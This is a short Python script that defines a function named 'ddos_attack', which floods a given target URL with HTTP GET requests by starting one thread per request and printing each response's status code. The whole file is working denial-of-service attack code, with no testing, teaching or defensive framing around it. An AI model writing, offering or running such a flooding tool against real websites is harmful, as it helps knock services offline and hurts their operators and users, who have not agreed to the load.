import requests
import threading

def ddos_attack(target_url, request_count):
    def send_request():
        try:
            response = requests.get(target_url)
            print(f"Request sent, status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error: {e}")

    threads = []
    for _ in range(request_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
